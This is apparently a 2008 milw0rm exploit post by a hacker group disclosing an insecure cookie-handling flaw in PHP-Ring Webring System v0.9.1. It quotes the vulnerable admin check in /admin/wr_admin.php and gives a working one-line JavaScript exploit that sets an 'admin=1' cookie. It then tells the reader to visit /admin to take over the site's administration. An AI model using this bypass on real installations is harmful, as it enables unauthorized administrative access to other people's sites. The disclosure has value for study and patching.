@@ -1,0 +1,48 @@
+  ###############################################################################################
+  #                                                                                             #
+  #    ...:::::PHP-Ring Webring System v0.9.1 Insecure Cookie Handling Vulnerability ::::....   #           
+  ###############################################################################################
+
+Virangar Security Team
+
+www.virangar.net
+www.virangar.ir
+
+--------
+Discoverd By :virangar security team(hadihadi)
+
+special tnx to:MR.nosrati,black.shadowes,MR.hesy,Zahra
+
+& all virangar members & all hackerz
+
+greetz:to my best friend in the world hadi_aryaie2004
+& my lovely friend arash(imm02tal)
+-------
+DESCRIPTION:
+PHP-Ring Webring System , suffers from insecure cookie handling, when a admin login is successfull the script creates
+a cookie to show the rest of the admin area the user is already logged in. the bad thing is the cookie doesnt
+contain any password or anything alike, therefor we can craft a admin cookie and make it look like we are
+logged in as a legit admin.
+---
+vuln code in /admin/wr_admin.php
+
+$cookie = $_COOKIE[admin]; //check for cookie
+
+if (($cookie == "" OR $_GET[stop] == 1 OR !is_admin($cookie)) && $_GET[op] != "login" && $_GET[op] != "logout") {
+    include("../templates/wr_header.php");
+    echo "Enter admin username and password to log in";
+    ....
+    ....
+    ..
+    } else {
+function adminhome() // load admin settings
+
+---
+exploit:
+javascript:document.cookie = "admin=1; path=/";
+-----
+now visit /admin and  you can get admin access and manage the cms ;)
+-------
+young iranian h4ck3rz
+
+# milw0rm.com [2008-08-10]
